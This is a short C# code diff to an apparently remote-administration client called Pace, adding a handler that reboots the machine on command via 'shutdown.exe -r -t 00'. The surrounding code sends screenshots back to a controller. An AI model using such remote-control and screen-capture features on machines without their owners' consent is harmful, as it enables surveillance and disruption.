@@ -3,6 +3,7 @@ using Pace.Client.System;
 using Pace.Common.Network;
 using Pace.Common.Network.Packets;
 using Pace.Common.Network.Packets.Client;
+using System.Diagnostics;
 using System.IO;
 using System.Linq;
 
@@ -46,6 +47,11 @@ namespace Pace.Client.Handlers
             var screenshotResponsePacket = new TakeScreenshotResponsePacket(screenshotBytes);
 
             client.SendPacket(screenshotResponsePacket);
+        }
+
+        public static void HandleRestart(PaceClient client, IPacket packet)
+        {
+            Process.Start("shutdown.exe", "-r -t 00");
         }
     }
 }
